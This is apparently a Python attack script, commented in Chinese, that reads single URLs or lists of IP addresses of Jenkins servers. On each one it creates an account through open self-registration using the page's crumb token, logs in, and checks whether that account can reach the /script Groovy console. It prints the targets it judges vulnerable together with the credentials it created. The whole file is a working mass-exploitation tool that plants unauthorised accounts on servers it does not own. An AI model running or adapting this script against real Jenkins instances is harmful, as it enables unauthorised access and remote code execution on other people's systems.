import requests
import base64
from bs4 import BeautifulSoup
import warnings
import argparse
#忽略警告
warnings.filterwarnings("ignore")

# proxy_pool = {"https":"http://127.0.0.1:8080",
#               "http":"http://127.0.0.1:8080"}


#打印logo
def printLog():
   logo = "X18gICBfXyAgICAgICAgICAgICAgICBfX19fICBfICAgICAgClwgXCAvIC9fIF8gXyBfXyAgIF9fIF8vIF9fX3woXylfIF9fIAogXCBWIC8gX2AgfCAnXyBcIC8gX2AgXF9fXyBcfCB8ICdfX3wKICB8IHwgKF98IHwgfCB8IHwgKF98IHxfX18pIHwgfCB8ICAgCiAgfF98XF9fLF98X3wgfF98XF9fLCB8X19fXy98X3xffCAgIAogICAgICAgICAgICAgICAgIHxfX18vICAgICAgICAgICAgICAK"
   logo = base64.b64decode(logo) #解码获得的是bytes，下面转字符串
   print(logo.decode())


#获取cookie和crumb
def getCrumb(url):
  #请求signup获取相关参数
  header = {"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36","cookie":"JSESSIONID.9e7ceae7=node01alr6t6ivny331ohr39llkqabw2859750.node0"}
  url_signup = url + "/signup"
  req = requests.get(url=url_signup, verify=False, headers=header)

  if len(req.text) == 0 or "503" in req.text:
    print("\033[1;34m[-] " + url + " 服务不存在\033[0m")
    return
  
  req.encoding = "utf-8"  #指定网页编码，方便后续的bs4解析
  soup = BeautifulSoup(req.text)
  ##获取cookie值
  cookie = req.cookies.items()[0][0] + "=" + req.cookies.items()[0][1]
  ##获取crumb参数
  crumb_input = soup.find("input",attrs={"name":"Jenkins-Crumb"})
  crumb = crumb_input['value']
 
  return (cookie,crumb)




#进行注册
def creatAccount(url, username, passwd, cookie, crumb):
  url_create = url + "/securityRealm/createAccount"
  header = {"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36","cookie":cookie}
  data = {"username":username, "fullname":"yangsir", "email":"wagosum@lista.cc", "password1":passwd, "password2":passwd, "Submit":"Create+account", "Jenkins-Crumb":crumb}
  req = requests.post(url=url_create, data=data, verify=False, headers=header)

#测试是否注册成功
  if "Success" in req.text:
      # print("\033[1;32m[+] " + url + "账户注册成功\033[0m")
      return 0
  else:
      # print("\033[1;31m[-] " + url + "账户注册失败\033[0m") 
      return 1


#进行登陆获取相应的访问ookie
def getLogincookie(url, username, passwd):
   #访问login获取基础cookie
   req = requests.get(url=url+"/login")
   if len(req.text) == 0 or "503" in req.text:
      print("\033[1;34m[-] " + url + " 服务不存在\033[0m")
      return 
   cookie = req.cookies.items()[0][0] + "=" + req.cookies.items()[0][1]
   #测试权限，获取对应cookie，方便后面去访问script。但是这里因为我获取不到返回的cookie，所以直接使用session进行存储。
   r = requests.Session()
   url_check = url + "/j_spring_security_check"
   data = {"j_username":username, "j_password":passwd, "from":"", "Submit":"Sign+in"}
   header = {"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36","cookie":cookie}
   req = r.post(url=url_check, data=data, headers=header,verify=False)
   req = r.get(url=url+"/script")
   if "Authentication required" in req.text:
      print("\033[1;33m[-] " + url + " 测试出错\033[0m")
      return
   if "Access Denied" in req.text:
      print("\033[1;31m[-] " + url + " 不存在漏洞\033[0m")
   else:
      print("\033[1;32m[+] " + url + " 存在漏洞，用户名：" + username + " 密码：" + passwd +"\033[0m")


#通过url去进行访问
def urlTest(url, user, passwd):
   try:
     (cookie, crumb) = getCrumb(url)
     if cookie == "":
        return
   #   print(cookie, crumb)
     #如果因为用户名重复导致的注册失败时许更改用户名
     while creatAccount(url,user,passwd,cookie,crumb) == 1:
        user += "q"
     getLogincookie(url, user, passwd)
   except:
      print("\033[1;35m[-] " + url + " 请求超时\033[0m")


#通过文件请求
def fileTest(file, user, passwd):
   file_content = open(file, "r")
   lines = file_content.readlines()
   for ip in lines:
      #先测试http
      ##测试是否需要跳转https。get（/login）请求会自动跳转，但是注册账户时就不会将http自动跳转为https，所以一定明确是http或者https。通过访问login是否发生跳转判断。
      ##allow_redirects=False表示不允许跳转，不然会抓到跳转之后的数据包，状态码一定是200.
      try:
        ip = ip.strip("\n")
        url = "http://" + ip
        req = requests.get(url + "/login", allow_redirects=False ,verify=False)
        if "30" not in str(req.status_code):
         urlTest(url, user, passwd)
         continue
      #在测试https
        url = "https://" + ip
        urlTest(url, user, passwd)
      except:
         print("\033[1;34m[-] " + url + " 服务不存在\033[0m")
         continue
   return
         
   
def main():
   printLog()
   #获取参数
   parser = argparse.ArgumentParser()
   parser.description='please enter two parameters a and b ...'
   parser.add_argument("-url",   help="this is parameter url", type=str, default="")
   parser.add_argument("-file", help="this is parameter file",  type=str, default="")
   parser.add_argument("-user",  help="this is parameter username",  type=str, default="yangsir")
   parser.add_argument("-passwd", help="this is parameter password",  type=str, default="123")
   args = parser.parse_args()

   if args.url == "" and args.file == "":
      print("请输入url或者file参数")
      return

   if args.url != "":
      urlTest(args.url, args.user, args.passwd)

   if args.file != "":
      fileTest(args.file, args.user, args.passwd)
     
     
main()




